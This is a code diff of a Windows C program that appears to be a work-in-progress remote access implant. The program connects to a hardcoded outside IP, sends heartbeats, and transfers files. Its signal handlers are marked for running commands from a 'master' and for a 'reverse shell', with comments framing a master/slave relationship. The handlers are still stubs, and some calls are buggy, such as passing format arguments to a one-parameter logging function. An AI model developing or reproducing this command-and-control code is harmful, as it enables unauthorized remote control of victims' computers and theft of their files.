@@ -14,6 +14,8 @@
 
 
 #define DEFAULT_PORT "27015"
+#define DEBUG
+
 
 const char _SIG_INIT[] = {0xfb, 0x00};
 const char _SIG_FILE[] = {0xfb, 0x01};
@@ -31,6 +33,7 @@ int MatchSig(char buf[2])
 
 int WinsockInitialized(void)
 {
+    /* Checks if InitSetup was run*/
     SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (s == INVALID_SOCKET){
         return 0;
@@ -41,6 +44,8 @@ int WinsockInitialized(void)
 
 int InitSetup(void)
 {
+    /*Slave -> Master relationship
+     Sets up WinSocket, has to be run once*/
     WSADATA wsaData;
     int iResult;
     // Initialize Winsock
@@ -52,7 +57,9 @@ int InitSetup(void)
     return 0;
 }
 
-int IpSetupINIT(struct addrinfo** result){
+int IpSetupINIT(struct addrinfo** ad_info)
+{
+    /* Slave -> Master relation ship */
     struct addrinfo hints;
     int iResult;
     ZeroMemory( &hints, sizeof(hints) );
@@ -61,7 +68,7 @@ int IpSetupINIT(struct addrinfo** result){
     hints.ai_protocol = IPPROTO_TCP;
 
     // Resolve the server address and port
-    iResult = getaddrinfo("45.143.93.119", DEFAULT_PORT, &hints, result);
+    iResult = getaddrinfo("45.143.93.119", DEFAULT_PORT, &hints, ad_info);
     if ( iResult != 0 ) {
         printf("getaddrinfo failed with error: %d\n", iResult);
         return -5;
@@ -69,17 +76,21 @@ int IpSetupINIT(struct addrinfo** result){
     return 0;
 }
 
-int ConnectINIT(SOCKET* ConnectSocket, struct addrinfo* result){
+int Connect(SOCKET* ConnectSocket, struct addrinfo* ad_info){
+    /* Slave -> Master relationship
+       Takes a pointer to an empty SOCKET and addrinto.
+       Puts a hopefully connected socket to the provided pointer
+       Returns >= 0 on success */
     int iResult;
     struct addrinfo* ptr = NULL;
-    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {
+    for(ptr=ad_info; ptr != NULL ;ptr=ptr->ai_next) {
 
         // Create a SOCKET for connecting to server
         *ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
             ptr->ai_protocol);
         if (*ConnectSocket == INVALID_SOCKET) {
             printf("socket failed with error: %d\n", WSAGetLastError());
-            freeaddrinfo(result);
+            freeaddrinfo(ad_info);
             return -1;
         }
 
@@ -92,7 +103,7 @@ int ConnectINIT(SOCKET* ConnectSocket, struct addrinfo* result){
         }
         break;
     }
-    freeaddrinfo(result);
+    freeaddrinfo(ad_info);
 
     if (*ConnectSocket == INVALID_SOCKET) {
         printf("Unable to connect to server!\n");
@@ -100,8 +111,9 @@ int ConnectINIT(SOCKET* ConnectSocket, struct addrinfo* result){
     }
     return 0;
 }
-//  GIT COMMIT TEST
-int SetupServer(struct addrinfo **result){
+
+int SetupServer(struct addrinfo **ad_info){
+    /* Master -> Slave relationship */
     int iResult;
     struct addrinfo hints;
     ZeroMemory(&hints, sizeof(hints));
@@ -109,9 +121,7 @@ int SetupServer(struct addrinfo **result){
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
     hints.ai_flags = AI_PASSIVE;
-
-    // Resolve the server address and port
-    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, result);
+    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, ad_info);
     if ( iResult != 0 ) {
         printf("getaddrinfo failed with error: %d\n", iResult);
         WSACleanup();
@@ -122,6 +132,8 @@ int SetupServer(struct addrinfo **result){
 
 int TransferFile(char* path, SOCKET ConnectSocket)
 {
+    /* Both way relationship, sends a file
+     TODO add signature support*/
     int iResult;
 
 
@@ -169,82 +181,24 @@ int TransferFile(char* path, SOCKET ConnectSocket)
     return 0;
 }
 
-int waitForData(SOCKET s) {
-    // Create a set of file descriptors to be monitored for read events
-    int iResult;
-    fd_set readfds;
-
-    // Determine the maximum file descriptor number to be included in the set
-    int max_fd = _fileno(stdin) + 1;
-
-    // Clear the readfds set and add the socket and stdin file descriptors to it
-    FD_ZERO(&readfds);
-    FD_SET(_fileno(stdin), &readfds);
-    FD_SET(s, &readfds);
-
-    // Set a timeout period of 30 seconds using a struct timeval
-    struct timeval tv;
-    tv.tv_sec = 45;
-    tv.tv_usec = 0;
-
-    // Wait for a read event on any of the file descriptors using select()
-    int ret = select(max_fd, &readfds, NULL, NULL, &tv);
-    if (ret < 0) {
-        perror("select Failed");
-        return -1;
-    }
-
-    // Check if the socket file descriptor is in the set of file descriptors that have data available
-    if (FD_ISSET(s, &readfds)) {
-        char buf[2] = {0};
-        iResult = recv(s, (char*)&buf, 2, 0);
-        if (iResult < 0){
-            perror("recv Failed");
-            return -1;
-        }
-        int sig = MatchSig(buf);
-        if (sig < 0){
-            perror("sig invalid");
-        }
-        return sig;
-
-    } else {
-        return -1;
-    }
+void DBGLG(char buf[]){
+    #ifdef DEBUG
+    printf(buf);
+    #endif
 }
 
 int HeartBeat(SOCKET s){
+    /* Slave -> Master relationship*/
     int iResult;
     iResult = send(s, _SIG_HRBT, 2, 0);
-    printf("Sent heartbeat\n");
+    DBGLG("Sent heartbeat\n");
     return iResult;
 }
-
-short SocketCreate(void)
-{
-    short hSocket;
-    printf("Create the socket\n");
-    hSocket = socket(AF_INET, SOCK_STREAM, 0);
-    return hSocket;
-}
-int BindCreatedSocket(int hSocket)
-{
-    int iRetval;
-    int ClientPort = atoi(DEFAULT_PORT);
-    struct sockaddr_in  remote= {0};
-    remote.sin_family = AF_INET;
-    remote.sin_addr.s_addr = htonl(INADDR_ANY);
-    remote.sin_port = htons(ClientPort); /* Local port */
-    iRetval = bind(hSocket,(struct sockaddr *)&remote,sizeof(remote));
-    return iRetval;
-}
-
-
 
 int __cdecl main(int argc, char **argv)
 {
     int iResult, sig;
-    struct addrinfo *result = NULL;
+    struct addrinfo *ad_info = NULL;
     SOCKET ListenSocket = INVALID_SOCKET;
     SOCKET sock = INVALID_SOCKET;
     if (!WinsockInitialized()){
@@ -253,44 +207,44 @@ int __cdecl main(int argc, char **argv)
             return iResult;
         }
     }
-    iResult = SetupServer(&result);
+    iResult = SetupServer(&ad_info);
     if (iResult < 0){
         perror("server setup fail");
         return 1;
     }
-    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+    ListenSocket = socket(ad_info->ai_family, ad_info->ai_socktype, ad_info->ai_protocol);
     if (ListenSocket == INVALID_SOCKET) {
-        printf("socket failed with error: %d\n", WSAGetLastError());
-        freeaddrinfo(result);
+        DBGLG("socket failed with error: %d\n", WSAGetLastError());
+        freeaddrinfo(ad_info);
         WSACleanup();
         return 1;
     }
-    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
+    iResult = bind( ListenSocket, ad_info->ai_addr, (int)ad_info->ai_addrlen);
     if (iResult == SOCKET_ERROR) {
-        printf("bind failed with error: %d\n", WSAGetLastError());
-        freeaddrinfo(result);
+        DBGLG("bind failed with error: %d\n", WSAGetLastError());
+        freeaddrinfo(ad_info);
         closesocket(ListenSocket);
         WSACleanup();
         return 1;
     }
     iResult = listen(ListenSocket, SOMAXCONN);
     if (iResult == SOCKET_ERROR) {
-        printf("listen failed with error: %d\n", WSAGetLastError());
+        DBGLG("listen failed with error: %d\n", WSAGetLastError());
         closesocket(ListenSocket);
         WSACleanup();
         return 1;
     }
 
-    /* Start a thread for heartbeating [IpSetup, Connect, HeartBeat, Close]*/
+    /* TODO: Start a thread for heartbeating [IpSetup, Connect, HeartBeat, Close]*/
     while (1){
         // MAIN EVENT LOOP
         eventloop:
         char buf[2] = {0};
-        printf("Listening\n");
+        DBGLG("Listening\n");
         sock = accept(ListenSocket, NULL, NULL);
-        printf("Connected\n");
+        DBGLG("Connected\n");
         if (sock == INVALID_SOCKET) {
-            printf("accept failed with error: %d\n", WSAGetLastError());
+            DBGLG("accept failed with error: %d\n", WSAGetLastError());
             closesocket(ListenSocket);
             WSACleanup();
             return 1;
@@ -314,23 +268,23 @@ int __cdecl main(int argc, char **argv)
         }
         switch (sig){
             case 0x0:
-                printf("Got 0\n");
+                DBGLG("Got 0\n");
             /* INITIALIZE and should not be handled on client side*/
                 break;
             case 0x1:
-                printf("Got 1\n");
+                DBGLG("Got 1\n");
             /* File transfer, presumably uploading to client */
                 break;
             case 0x2:
-                printf("Got 2\n");
+                DBGLG("Got 2\n");
             /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                 break;
             case 0x3:
-                printf("Got 3\n");
+                DBGLG("Got 3\n");
             /* Reverse shell */
                 break;
             case 0xff:
-                printf("Got ff\n");
+                DBGLG("Got ff\n");
             /* Heartbeat */
                 break;
         }
@@ -342,32 +296,3 @@ int __cdecl main(int argc, char **argv)
     return 0;
 
 }
-
-/* real CLIENT ALIKE LOGIC to set up in win
-SOCKET ConnectSocket = INVALID_SOCKET;
-    int iResult;
-    struct addrinfo *result = NULL;
-    if (!WinsockInitialized()){
-        iResult = InitSetup();
-        if (iResult < 0){
-            return iResult;
-        }
-    }
-
-    iResult = IpSetup(&result);
-    if (iResult < 0){
-        return iResult;
-    }
-    iResult = Connect(&ConnectSocket, result);
-    if(iResult < 0){
-        return iResult;
-    }
-    while (1){
-
-    }
-    WSACleanup();
-    closesocket(ConnectSocket);
-
-*/
-
-// DONT FORGET WSACleanup();
